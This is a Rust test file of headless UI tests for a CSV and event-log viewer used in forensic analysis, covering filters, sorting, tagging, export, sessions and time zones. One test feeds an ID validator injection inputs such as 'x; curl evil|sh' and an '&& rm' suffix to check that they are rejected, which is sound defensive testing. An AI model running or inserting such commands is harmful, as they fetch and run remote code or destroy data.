//! UI smoke tests (egui_kittest, headless): open a file, wait for the
//! index, filter, sort, tag, export, session round trip.

use std::path::Path;
use std::time::{Duration, Instant};

use egui_kittest::Harness;
use egui_kittest::kittest::Queryable;
use fhv_engine::filter::Op;

use crate::app::App;
use crate::settings::Settings;

fn sample(dir: &Path) -> std::path::PathBuf {
    let p = dir.join("events.csv");
    let mut s = String::from("Time,EventId,User,Message\n");
    for i in 0..1000u32 {
        s.push_str(&format!(
            "2024-03-11 10:{:02}:{:02}.0000000,{},{},\"msg {i}, \"\"q\"\"\"\n",
            i / 60 % 60,
            i % 60,
            [4624, 4625, 4688][(i % 3) as usize],
            ["jdoe", "asmith", "SYSTEM", "bwilson"][(i % 4) as usize]
        ));
    }
    std::fs::write(&p, s).unwrap();
    p
}

fn harness(dir: &Path, file: &Path) -> Harness<'static, App> {
    let file = file.to_path_buf();
    let cache = dir.join("cache");
    Harness::builder()
        .with_size([1400.0, 800.0])
        .build_eframe(move |cc| {
            App::with(cc, vec![file.clone()], Settings::default(), cache.clone())
        })
}

/// Steps the UI until `done` holds (background threads need real time).
fn wait(h: &mut Harness<'static, App>, done: impl Fn(&App) -> bool) {
    let t0 = Instant::now();
    while !done(h.state()) {
        assert!(t0.elapsed() < Duration::from_secs(20), "timed out");
        std::thread::sleep(Duration::from_millis(5));
        h.step();
    }
    h.step();
}

fn idle(a: &App) -> bool {
    let t = &a.tabs[0];
    t.ready() && t.job.is_none() && !t.view.is_empty()
}

#[test]
fn open_filter_sort_tag_export_session() {
    let dir = tempfile::tempdir().unwrap();
    let file = sample(dir.path());
    let mut h = harness(dir.path(), &file);
    wait(&mut h, idle);
    h.get_by_label_contains("showing 1,000 of 1,000 rows");

    // Quick filter from the filter row state: User contains "jd".
    h.state_mut().tabs[0].filters[2].quick = "jd".into();
    h.state_mut().tabs[0].requery();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() == 250);
    h.get_by_label_contains("showing 250 of 1,000 rows");

    // A condition on a dictionary column, then clear filters with the button.
    h.state_mut().tabs[0].filters[1]
        .conds
        .push(Op::In(vec!["4625".into()]));
    h.state_mut().tabs[0].requery();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() == 83);
    h.get_by_label("Clear filters").click();
    h.step();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() == 1000);

    // Sort by EventId descending: first row is a 4688.
    h.state_mut().tabs[0].sort = vec![fhv_engine::SortKey { col: 1, desc: true }];
    h.state_mut().tabs[0].requery();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.order.is_some());
    let first = h.state().tabs[0].view.row_at(0).unwrap();
    assert_eq!(first % 3, 2);

    // Tag two rows, show tagged only with the toolbar toggle.
    h.state_mut().tabs[0].toggle_tag(5);
    h.state_mut().tabs[0].toggle_tag(7);
    h.step();
    h.get_by_label_contains("tagged (2)").click();
    h.step();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() == 2);

    // Export the view.
    let out = dir.path().join("out.csv");
    let cols = h.state().tabs[0].order.clone();
    h.state_mut().tabs[0].start_export(out.clone(), false, cols, fhv_engine::export::Format::Csv);
    wait(&mut h, |a| a.tabs[0].job.is_none());
    let text = std::fs::read_to_string(&out).unwrap();
    assert_eq!(text.lines().count(), 3, "{text}");
    assert!(text.starts_with("Time,EventId,User,Message\n"));
    assert!(text.contains("\"msg 7, \"\"q\"\"\""));

    // Session round trip onto a fresh tab state.
    let s = crate::session::capture(&h.state().tabs[0]);
    let json = serde_json::to_string(&s).unwrap();
    let s2: crate::session::Session = serde_json::from_str(&json).unwrap();
    let t = &mut h.state_mut().tabs[0];
    t.tags.clear();
    t.sort.clear();
    t.tagged_only = false;
    let warn = crate::session::apply(t, &s2);
    assert!(warn.is_empty(), "{warn:?}");
    assert_eq!(t.tags.len(), 2);
    assert!(t.tagged_only);
    assert_eq!(t.sort.len(), 1);
    // The input file was never modified.
    assert!(
        std::fs::read_to_string(&file)
            .unwrap()
            .starts_with("Time,EventId,User,Message\n")
    );
}

/// Every window and pane renders without panicking (missing glyphs panic
/// under kittest).
#[test]
fn windows_and_panes_render() {
    let dir = tempfile::tempdir().unwrap();
    let file = sample(dir.path());
    let mut h = harness(dir.path(), &file);
    wait(&mut h, idle);
    h.state_mut().tabs[0].grid.selected = Some(3);
    h.state_mut().tabs[0].toggle_tag(3);
    h.state_mut().open_filter_editor(1);
    h.state_mut().columns_dlg = true;
    h.state_mut().help = true;
    h.run_steps(3);
    h.get_by_label("Row 4");
    h.get_by_label_contains("Values (3,");
    h.get_by_label("Keyboard shortcuts");
    h.get_by_label("Show all");
}

#[test]
fn global_search_highlights_and_navigates() {
    let dir = tempfile::tempdir().unwrap();
    let file = sample(dir.path());
    let mut h = harness(dir.path(), &file);
    wait(&mut h, idle);
    h.state_mut().tabs[0].search = "msg 99".into();
    wait(&mut h, |a| {
        a.tabs[0].search_hits.is_some() && a.tabs[0].job.is_none()
    });
    // msg 99, msg 990..999 -> 11 rows.
    assert_eq!(h.state().tabs[0].search_hits.as_ref().unwrap().len(), 11);
    let p = h.state().tabs[0].find_hit(true).unwrap();
    assert_eq!(h.state().tabs[0].view.row_at(p), Some(99));
}

#[test]
fn broken_file_does_not_crash() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("bad.csv");
    std::fs::write(&file, b"a,b\n1,\"open\n2,3\n\xff\xfe,\x00\n4,5,6\n").unwrap();
    let mut h = harness(dir.path(), &file);
    wait(&mut h, |a| a.tabs[0].ready() && a.tabs[0].job.is_none());
    h.step();
    assert!(h.state().tabs[0].load_error.is_none());
}

/// Typing into the global search box and a filter-row box changes the view.
#[test]
fn typing_in_search_and_filter_row() {
    let dir = tempfile::tempdir().unwrap();
    let file = sample(dir.path());
    let mut h = harness(dir.path(), &file);
    wait(&mut h, idle);
    h.get_by_label("Search").focus();
    h.step();
    h.get_by_label("Search").type_text("msg 99");
    h.step();
    assert_eq!(h.state().tabs[0].search, "msg 99");
    // Filter row: the User column's box (accessible label "filter User").
    h.get_by_label("filter User").focus();
    h.step();
    h.get_by_label("filter User").type_text("jdoe");
    h.step();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() == 250);
}

/// Review R-001 / R-002: the filter editor survives tab switches and being
/// opened before the column index exists.
#[test]
fn filter_editor_tab_switch_and_early_open() {
    let dir = tempfile::tempdir().unwrap();
    let wide = sample(dir.path());
    let narrow = dir.path().join("narrow.csv");
    std::fs::write(&narrow, "a\n1\n2\n").unwrap();
    let mut h = harness(dir.path(), &wide);
    // Open the editor on the last column immediately (index not built yet).
    h.state_mut().open_filter_editor(2);
    h.run_steps(2);
    wait(&mut h, idle);
    h.run_steps(2);
    h.get_by_label_contains("Values (");
    // Another (narrower) file becomes active: the editor closes, no panic.
    h.state_mut().open(&narrow);
    h.run_steps(3);
    wait(&mut h, |a| a.tabs.len() == 2 && a.tabs[1].ready());
    h.run_steps(2);
}

#[test]
fn guards_and_formatting() {
    use crate::app::{
        pretty_json_for_test as pj, refuse_target, shell_quote_for_test as sq,
        valid_forhunt_id_for_test as vid,
    };
    let dir = tempfile::tempdir().unwrap();
    let file = sample(dir.path());
    let mut h = harness(dir.path(), &file);
    wait(&mut h, idle);
    let tabs = &h.state().tabs;
    assert!(refuse_target(tabs, &file).is_some());
    #[cfg(unix)]
    {
        let link = dir.path().join("link.csv");
        std::os::unix::fs::symlink(&file, &link).unwrap();
        assert!(refuse_target(tabs, &link).is_some(), "symlink to the input");
        let hard = dir.path().join("hard.csv");
        std::fs::hard_link(&file, &hard).unwrap();
        assert!(
            refuse_target(tabs, &hard).is_some(),
            "hard link to the input"
        );
    }
    let rel = dir.path().join("sub/../events.csv");
    std::fs::create_dir_all(dir.path().join("sub")).unwrap();
    assert!(
        refuse_target(tabs, &rel).is_some(),
        "relative path to the input"
    );
    assert!(refuse_target(tabs, &dir.path().join("other.csv")).is_none());
    assert!(vid("4a2aa2ed:53413"));
    assert!(!vid("x; curl evil|sh"));
    assert!(!vid("4a2aa2ed:53413 && rm"));
    assert_eq!(sq("/cases/a b/$(x)"), "'/cases/a b/$(x)'");
    assert_eq!(sq("it's"), "'it'\\''s'");
    assert_eq!(sq("/plain/path"), "/plain/path");
    // Key order, duplicate keys and number spelling are kept.
    assert_eq!(
        pj(r#"{"b":1.10,"a":2,"a":[],"s":"x,y:{"}"#).unwrap(),
        "{\n  \"b\": 1.10,\n  \"a\": 2,\n  \"a\": [],\n  \"s\": \"x,y:{\"\n}"
    );
    assert!(pj("{not json").is_none());
}

fn case_variants(dir: &Path) -> std::path::PathBuf {
    let p = dir.join("users.csv");
    let mut s = String::from("n,User\n");
    for i in 0..1000u32 {
        s.push_str(&format!(
            "{i},{}\n",
            ["Admin", "admin", "ADMIN", "bob"][(i % 4) as usize]
        ));
    }
    std::fs::write(&p, s).unwrap();
    p
}

/// The value list selects exactly the ticked values, also when values differ
/// only by case and the column filter is case-insensitive (the default):
/// ticking "admin" used to show "Admin" and "ADMIN" too, and unticking
/// "ADMIN" hid all three.
#[test]
fn value_list_selects_exact_values() {
    let dir = tempfile::tempdir().unwrap();
    let file = case_variants(dir.path());
    let mut h = harness(dir.path(), &file);
    wait(&mut h, idle);
    assert!(!h.state().tabs[0].filters[1].case_sensitive);
    let users = |a: &App| -> Vec<String> {
        let t = &a.tabs[0];
        let mut v: Vec<String> = t
            .view
            .iter()
            .map(|r| t.table.row_fields(r as u64).unwrap()[1].clone())
            .collect();
        v.sort();
        v.dedup();
        v
    };

    // Only "admin" ticked.
    h.state_mut().open_filter_editor(1);
    h.run_steps(3);
    h.get_by_label("none").click();
    h.step();
    h.get_by_label("admin   (250)").click();
    h.step();
    h.get_by_label("Apply value selection").click();
    h.step();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() != 1000);
    assert_eq!(users(h.state()), ["admin"]);
    assert_eq!(h.state().tabs[0].view.len(), 250);

    // Everything but "ADMIN" (a "not in" list, the shorter one).
    h.state_mut().tabs[0].filters[1] = Default::default();
    h.state_mut().tabs[0].requery();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() == 1000);
    h.state_mut().open_filter_editor(1);
    h.run_steps(3);
    h.get_by_label("ADMIN   (250)").click();
    h.step();
    h.get_by_label("Apply value selection").click();
    h.step();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() != 1000);
    assert_eq!(users(h.state()), ["Admin", "admin", "bob"]);
    assert_eq!(h.state().tabs[0].view.len(), 750);
}

/// "≠ this value" from a cell drops exactly that value (not its case
/// variants: excluding "admin" used to hide "Admin" and "ADMIN" too), and
/// "= this value" narrows the selection; sessions keep the selection.
#[test]
fn cell_value_filters_are_exact_and_saved() {
    let dir = tempfile::tempdir().unwrap();
    let file = case_variants(dir.path());
    let mut h = harness(dir.path(), &file);
    wait(&mut h, idle);
    h.state_mut().tabs[0].filters[1].filter_value("admin".into(), true);
    h.state_mut().tabs[0].requery();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() != 1000);
    assert_eq!(h.state().tabs[0].view.len(), 750);
    assert!(h.state().tabs[0].view.iter().all(|r| r % 4 != 1));
    h.state_mut().tabs[0].filters[1].filter_value("bob".into(), true);
    h.state_mut().tabs[0].requery();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() != 750);
    assert_eq!(h.state().tabs[0].view.len(), 500);

    let s = crate::session::capture(&h.state().tabs[0]);
    let json = serde_json::to_string(&s).unwrap();
    let s2: crate::session::Session = serde_json::from_str(&json).unwrap();
    let t = &mut h.state_mut().tabs[0];
    t.filters[1] = Default::default();
    crate::session::apply(t, &s2);
    assert_eq!(
        t.filters[1].values,
        Some(Op::NotIn(vec!["admin".into(), "bob".into()]))
    );

    // "= ADMIN" on top: only ADMIN; "= bob" then: nothing (bob is excluded).
    h.state_mut().tabs[0].filters[1].filter_value("ADMIN".into(), false);
    h.state_mut().tabs[0].requery();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() == 250);
    assert!(h.state().tabs[0].view.iter().all(|r| r % 4 == 2));
    h.state_mut().tabs[0].filters[1].filter_value("bob".into(), false);
    assert_eq!(h.state().tabs[0].filters[1].values, Some(Op::In(vec![])));
}

/// F3 / Shift+F3 visit every hit in display order, in both directions, in
/// file order and in a sorted view, wrapping around; with no selection,
/// Shift+F3 starts from the last row (it used to skip display row 0 in a
/// sorted view).
#[test]
fn f3_visits_every_hit_in_view_order() {
    let dir = tempfile::tempdir().unwrap();
    let file = sample(dir.path());
    let mut h = harness(dir.path(), &file);
    wait(&mut h, idle);
    // "msg 99" hits rows 99 and 990..999.
    h.state_mut().tabs[0].search = "msg 99".into();
    wait(&mut h, |a| {
        a.tabs[0].search_hits.is_some() && a.tabs[0].job.is_none()
    });
    for sort in [None, Some(true), Some(false)] {
        let t = &mut h.state_mut().tabs[0];
        // Message descending puts "msg 999" first; ascending "msg 0".
        t.sort = sort
            .map(|desc| vec![fhv_engine::SortKey { col: 3, desc }])
            .unwrap_or_default();
        t.requery();
        wait(&mut h, |a| {
            idle(a) && a.tabs[0].view.order.is_some() == sort.is_some()
        });
        let t = &mut h.state_mut().tabs[0];
        let hits = t.search_hits.clone().unwrap();
        let want: Vec<u64> = (0..t.view.len())
            .filter(|&p| hits.contains(t.view.row_at(p).unwrap()))
            .collect();
        assert_eq!(want.len(), 11);
        for forward in [true, false] {
            t.grid.selected = None;
            let mut seen = Vec::new();
            for _ in 0..want.len() {
                let p = t.find_hit(forward).unwrap();
                seen.push(p);
                t.grid.selected = Some(p);
            }
            let mut expect = want.clone();
            if !forward {
                expect.reverse();
            }
            assert_eq!(seen, expect, "sort {sort:?} forward {forward}");
            // And it wraps around.
            assert_eq!(t.find_hit(forward), Some(expect[0]));
        }
    }
    // A single hit on display row 0 of a sorted view (Message descending).
    h.state_mut().tabs[0].sort = vec![fhv_engine::SortKey { col: 3, desc: true }];
    h.state_mut().tabs[0].requery();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.row_at(0) == Some(999));
    h.state_mut().tabs[0].search = "msg 999".into();
    wait(&mut h, |a| {
        a.tabs[0].search_hits.as_ref().is_some_and(|b| b.len() == 1) && a.tabs[0].job.is_none()
    });
    let t = &mut h.state_mut().tabs[0];
    assert_eq!(t.view.row_at(0), Some(999));
    for forward in [true, false] {
        t.grid.selected = None;
        assert_eq!(
            t.find_hit(forward),
            Some(0),
            "no selection, forward {forward}"
        );
        t.grid.selected = Some(0);
        assert_eq!(
            t.find_hit(forward),
            Some(0),
            "on the hit, forward {forward}"
        );
    }
}

/// A session restores "bad rows only" too, and the restored filter keeps
/// only the bad rows even when it is applied while the file is still
/// indexing (the bad-row set did not exist yet).
#[test]
fn session_restores_bad_rows_only() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("ragged.csv");
    // Large enough that indexing is usually still running when the session
    // is applied to the second window.
    let mut s = String::from("a,b,c\n");
    for i in 0..400_000 {
        if i % 40_000 == 7 {
            s.push_str(&format!("{i},short\n"));
        } else {
            s.push_str(&format!("{i},x,y\n"));
        }
    }
    std::fs::write(&file, s).unwrap();
    let mut h = harness(dir.path(), &file);
    wait(&mut h, idle);
    h.state_mut().tabs[0].bad_rows();
    h.state_mut().tabs[0].bad_only = true;
    h.state_mut().tabs[0].requery();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() == 10);
    let session = crate::session::capture(&h.state().tabs[0]);
    let json = serde_json::to_string(&session).unwrap();

    // Fresh window with its own cache: the session is applied before the
    // bad-row set exists (and usually before indexing finishes; on a fast
    // machine it may already be done, which must not matter).
    let dir2 = tempfile::tempdir().unwrap();
    let mut h = harness(dir2.path(), &file);
    let s2: crate::session::Session = serde_json::from_str(&json).unwrap();
    crate::session::apply(&mut h.state_mut().tabs[0], &s2);
    std::thread::sleep(Duration::from_millis(300));
    wait(&mut h, idle);
    let t = &h.state().tabs[0];
    assert!(t.bad_only);
    let rows: Vec<u32> = t.view.iter().collect();
    let want: Vec<u32> = (0..400_000).filter(|i| i % 40_000 == 7).collect();
    assert!(rows == want, "{} rows shown, want {want:?}", rows.len());
}

/// Export writes the rows of the filter shown in the chips: while a new
/// filter is not applied yet (typing pause) or failed (bad regex), it
/// refuses instead of writing the previous view's rows.
#[test]
fn export_refuses_a_view_that_is_not_the_current_filter() {
    let dir = tempfile::tempdir().unwrap();
    let file = sample(dir.path());
    let mut h = harness(dir.path(), &file);
    wait(&mut h, idle);
    let out = dir.path().join("out.csv");
    let cols = h.state().tabs[0].order.clone();
    // A new filter, not applied yet.
    let t = &mut h.state_mut().tabs[0];
    t.filters[2].quick = "jdoe".into();
    t.requery();
    t.start_export(
        out.clone(),
        false,
        cols.clone(),
        fhv_engine::export::Format::Csv,
    );
    assert!(t.job.is_none() && !out.exists(), "exported a stale view");
    t.start_copy_column(2);
    assert!(t.job.is_none(), "copied a stale view");
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() == 250);
    // Applied: the export holds exactly the filtered rows.
    h.state_mut().tabs[0].start_export(
        out.clone(),
        false,
        cols.clone(),
        fhv_engine::export::Format::Csv,
    );
    wait(&mut h, |a| a.tabs[0].job.is_none());
    let text = std::fs::read_to_string(&out).unwrap();
    assert_eq!(text.lines().count(), 251);
    assert!(text.lines().skip(1).all(|l| l.contains(",jdoe,")));
    std::fs::remove_file(&out).unwrap();
    // A filter that fails (invalid regex): the view still shows the rows
    // of the previous filter; no export.
    h.state_mut().tabs[0].filters[3]
        .conds
        .push(Op::Regex("(".into()));
    h.state_mut().tabs[0].requery();
    wait(&mut h, |a| {
        a.tabs[0].job.is_none()
            && a.tabs[0]
                .status
                .as_deref()
                .is_some_and(|s| s.starts_with("error"))
    });
    h.state_mut().tabs[0].start_export(out.clone(), false, cols, fhv_engine::export::Format::Csv);
    h.step();
    assert!(h.state().tabs[0].job.is_none() && !out.exists());
}

/// "Copy forhunt show command" points at the evidence the tab was parsed
/// from, not at the evidence parsed last in another tab (that command
/// failed with "not found").
#[test]
fn forhunt_show_uses_the_tabs_own_evidence() {
    use crate::app::forhunt_show_command_for_test as cmd;
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("events.csv");
    std::fs::write(&file, "TimeCreated,EventId,ForhuntId\n2024-03-11 10:00:00,4624,4a2aa2ed:12\n2024-03-11 10:00:01,4625,bad id\n").unwrap();
    let mut h = harness(dir.path(), &file);
    wait(&mut h, idle);
    let t = &mut h.state_mut().tabs[0];
    // A plain CSV: the path from the forhunt menu, else a placeholder.
    assert_eq!(
        cmd(t, 0, "/case/B"),
        Some(Ok("forhunt show 4a2aa2ed:12 -p /case/B".into()))
    );
    assert_eq!(
        cmd(t, 0, ""),
        Some(Ok("forhunt show 4a2aa2ed:12 -p '<evidence>'".into()))
    );
    assert!(matches!(cmd(t, 1, "/case/B"), Some(Err(_))));
    // A tab parsed by forhunt from /case/A while /case/B was parsed last.
    t.origin = Some(("A".into(), "/case/A dir".into()));
    assert_eq!(
        cmd(t, 0, "/case/B"),
        Some(Ok("forhunt show 4a2aa2ed:12 -p '/case/A dir'".into()))
    );
}

/// Opening an event log: forhunt parses it, the tab opens sorted by
/// TimeCreated (oldest first, ties in file order), knows its evidence, and
/// the rows are exactly those of the CSV.
#[test]
fn evtx_opens_as_a_timeline_sorted_by_time() {
    let dir = tempfile::tempdir().unwrap();
    let evtx = std::path::PathBuf::from(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/testdata/PowerShell.evtx"
    ));
    let mut h = harness(dir.path(), &evtx);
    wait(&mut h, |a| {
        a.tabs.len() == 1 && idle(a) && a.tabs[0].view.order.is_some()
    });
    let t = &h.state().tabs[0];
    assert_eq!(t.origin.as_ref().map(|o| o.1.as_str()), evtx.to_str());
    let tc = t
        .table
        .columns
        .iter()
        .position(|c| c == "TimeCreated")
        .unwrap();
    assert_eq!(
        t.sort,
        [fhv_engine::SortKey {
            col: tc,
            desc: false
        }]
    );
    assert_eq!(t.view.len(), t.table.row_count());
    let key = |r: u32| {
        let f = t.table.row_fields(r as u64).unwrap();
        (fhv_engine::time::parse_any(f[tc].as_bytes()).unwrap(), r)
    };
    let shown: Vec<(i64, u32)> = t.view.iter().map(key).collect();
    let mut want = shown.clone();
    want.sort();
    assert_eq!(shown, want);
}

/// Every UI filter at once (quick filter, conditions with match any, value
/// selection, global search with "only matches", tagged only) keeps
/// exactly the rows a plain evaluation of the same rules keeps; Clear
/// filters brings every row back.
#[test]
fn combined_ui_filters_equal_a_plain_evaluation() {
    let dir = tempfile::tempdir().unwrap();
    let file = sample(dir.path());
    let mut h = harness(dir.path(), &file);
    wait(&mut h, idle);
    let t = &mut h.state_mut().tabs[0];
    // User: quick "S" (case-insensitive: asmith, SYSTEM), value selection
    // without SYSTEM; EventId: 4624 or > 4680; Message search "msg 1".
    t.filters[2].quick = "S".into();
    t.filters[2].set_values([
        ("asmith", true),
        ("bwilson", true),
        ("jdoe", true),
        ("SYSTEM", false),
    ]);
    t.filters[1].conds = vec![Op::Equals("4624".into()), Op::Gt("4680".into())];
    t.filters[1].any = true;
    t.search = "MSG 1".into();
    t.search_filter = true;
    for r in [1u32, 2, 5, 10, 13, 100, 101, 999] {
        t.toggle_tag(r);
    }
    t.tagged_only = false;
    t.requery();
    let want = |tagged: bool| -> Vec<u32> {
        (0..1000u32)
            .filter(|&i| {
                let ev = [4624, 4625, 4688][(i % 3) as usize];
                let user = ["jdoe", "asmith", "SYSTEM", "bwilson"][(i % 4) as usize];
                let msg = format!("msg {i}, \"q\"");
                user.to_lowercase().contains('s')
                    && user != "SYSTEM"
                    && (ev == 4624 || ev > 4680)
                    && msg.contains("msg 1")
                    && (!tagged || [1, 2, 5, 10, 13, 100, 101, 999].contains(&i))
            })
            .collect()
    };
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() < 1000);
    assert_eq!(
        h.state().tabs[0].view.iter().collect::<Vec<_>>(),
        want(false)
    );
    h.state_mut().tabs[0].tagged_only = true;
    h.state_mut().tabs[0].requery();
    wait(&mut h, |a| {
        a.tabs[0].ready()
            && a.tabs[0].job.is_none()
            && a.tabs[0].view.len() == want(true).len() as u64
    });
    assert_eq!(
        h.state().tabs[0].view.iter().collect::<Vec<_>>(),
        want(true)
    );
    h.get_by_label("Clear filters").click();
    h.step();
    wait(&mut h, |a| idle(a) && a.tabs[0].view.len() == 1000);
    assert!(h.state().tabs[0].filters.iter().all(|f| !f.is_active()));
}

/// Display zone Europe/Paris: times typed in a time filter mean what the
/// analyst sees. Hourly UTC events over the October 2025 DST change
/// (2025-10-26 is a 25-hour day in Paris) and the March one (23 hours).
#[test]
fn time_filters_follow_the_display_zone() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("hours.csv");
    let mut s = String::from("TimeCreated,n\n");
    for (day0, hours) in [(1_761_350_400i64, 96), (1_743_206_400, 96)] {
        // 2025-10-25T00:00Z and 2025-03-29T00:00Z, 4 days each.
        for h in 0..hours {
            let t = (day0 + h * 3600) * fhv_engine::time::TICKS_PER_SEC;
            s.push_str(&format!("{}Z,{h}\n", fhv_engine::time::format(t, 0)));
        }
    }
    std::fs::write(&file, s).unwrap();
    let cache = dir.path().join("cache");
    let settings = Settings {
        tz: "Europe/Paris".into(),
        ..Settings::default()
    };
    let f = file.clone();
    let mut h = Harness::builder()
        .with_size([1400.0, 800.0])
        .build_eframe(move |cc| App::with(cc, vec![f.clone()], settings.clone(), cache.clone()));
    wait(&mut h, idle);
    let count = |h: &mut Harness<'static, App>, op: Op| -> u64 {
        let t = &mut h.state_mut().tabs[0];
        t.filters[0].conds = vec![op];
        t.requery();
        let q = t.query();
        wait(h, |a| {
            let t = &a.tabs[0];
            t.ready() && t.job.is_none() && t.view_query_for_test() == Some(&q)
        });
        h.state().tabs[0].view.len()
    };
    // Paris 2025-10-26: 2025-10-25T22:00Z .. 2025-10-26T22:59Z = 25 events.
    assert_eq!(
        count(
            &mut h,
            Op::Between("2025-10-26".into(), "2025-10-26".into())
        ),
        25
    );
    // Paris 2025-03-30: 23 events.
    assert_eq!(
        count(
            &mut h,
            Op::Between("2025-03-30".into(), "2025-03-30".into())
        ),
        23
    );
    // 02:30 happens twice on 2025-10-26: <= keeps both (up to 01:30Z),
    // >= starts at the first one (00:30Z).
    let le = count(&mut h, Op::Le("2025-10-26 02:30".into()));
    assert_eq!(le, 26 + 96, "Oct 25 00:00Z .. Oct 26 01:00Z, plus March");
    let ge = count(&mut h, Op::Ge("2025-10-26 02:30".into()));
    assert_eq!(ge, 96 - 25);
    // An explicit offset is taken as written.
    assert_eq!(count(&mut h, Op::Lt("2025-10-25T01:00:00Z".into())), 96 + 1);
    // Text matching on the time column sees UTC file values: the chip and
    // the search box say so; range chips carry no such note.
    assert!(
        h.query_all_by_label_contains("[UTC file values]")
            .next()
            .is_none()
    );
    h.state_mut().tabs[0].filters[0].quick = "2025-10-26 01".into();
    h.state_mut().tabs[0].search = "2025".into();
    h.run_steps(2);
    h.get_by_label_contains("contains \"2025-10-26 01\" [UTC file values]");
    h.get_by_label("time columns: UTC file values");
}

/// A file without numbers or dates: taking the first row as the header is
/// a guess, shown in the status bar. Reopening without a header brings the
/// first row back as data; a delimiter override splits the columns again.
#[test]
fn reopen_with_header_and_delimiter_options() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("pairs.csv");
    std::fs::write(&file, "alice,pc1\nbob,pc2\ncarol,pc3\n").unwrap();
    let mut h = harness(dir.path(), &file);
    wait(&mut h, idle);
    assert!(h.state().tabs[0].table.header_guessed);
    assert_eq!(h.state().tabs[0].table.row_count(), 2);
    h.get_by_label("first row taken as header (a guess)");
    h.state_mut().reopen_with(0, false, b',');
    wait(&mut h, idle);
    let t = &h.state().tabs[0];
    assert_eq!(t.table.row_count(), 3);
    assert_eq!(t.table.row_fields(0).unwrap(), ["alice", "pc1"]);
    assert!(!t.table.header_guessed);
    assert!(
        h.query_by_label("first row taken as header (a guess)")
            .is_none()
    );
    // Delimiter: read the same file with ';' (one column per row).
    h.state_mut().reopen_with(0, false, b';');
    wait(&mut h, idle);
    let t = &h.state().tabs[0];
    assert_eq!(t.table.columns.len(), 1);
    assert_eq!(t.table.row_fields(1).unwrap(), ["bob,pc2"]);
    // A file with numbers: the header is not a guess.
    let num = dir.path().join("num.csv");
    std::fs::write(&num, "user,count\nalice,3\n").unwrap();
    h.state_mut().open(&num);
    wait(&mut h, |a| a.tabs.len() == 2 && a.tabs[1].ready());
    assert!(!h.state().tabs[1].table.header_guessed);
}

/// Day-first dates with every day <= 12 read month first unless the
/// analyst sets the order (header menu); a range condition's chip shows the
/// cells it leaves out (not dates, blank); sessions keep the order.
#[test]
fn date_order_override_and_excluded_cells_on_chips() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("eu.csv");
    let mut s = String::from("TimeCreated,Seen\n");
    for i in 0..48u32 {
        let (d, m) = (12 - i % 12, 3 + (i / 12) % 2);
        s.push_str(&format!("2025-01-01 00:00:{:02},{d}/{m}/2025\n", i % 60));
    }
    s.push_str("2025-01-01 00:01:00,n/a\n2025-01-01 00:01:01,\n2025-01-01 00:01:02,later\n");
    std::fs::write(&file, s).unwrap();
    let mut h = harness(dir.path(), &file);
    wait(&mut h, idle);
    let run = |h: &mut Harness<'static, App>| {
        let q = h.state().tabs[0].query();
        wait(h, |a| {
            let t = &a.tabs[0];
            t.ready() && t.job.is_none() && t.view_query_for_test() == Some(&q)
        });
        h.run_steps(2);
    };
    let t = &mut h.state_mut().tabs[0];
    t.filters[1].conds = vec![Op::Between("2025-03-01".into(), "2025-03-31".into())];
    t.requery();
    run(&mut h);
    // Read month first, "3/3/2025" and "3/4/2025" are the only March
    // dates (one of each per block of 12): 4 rows instead of 24.
    assert_eq!(h.state().tabs[0].view.len(), 4);
    h.get_by_label_contains("[2 cells not dates, 1 blank: excluded]");
    h.state_mut().tabs[0].set_date_order(1, Some(fhv_engine::time::Order::Dmy));
    run(&mut h);
    let t = &h.state().tabs[0];
    assert_eq!(t.view.len(), 24);
    assert!(t.view.iter().all(|r| r < 48 && (r / 12) % 2 == 0));
    // Session: the order comes back.
    let json = serde_json::to_string(&crate::session::capture(&h.state().tabs[0])).unwrap();
    let s2: crate::session::Session = serde_json::from_str(&json).unwrap();
    h.state_mut().tabs[0].set_date_order(1, None);
    crate::session::apply(&mut h.state_mut().tabs[0], &s2);
    assert_eq!(
        h.state().tabs[0].kind(1),
        fhv_engine::columns::Kind::Time(fhv_engine::time::Order::Dmy)
    );
    run(&mut h);
    assert_eq!(h.state().tabs[0].view.len(), 24);
}
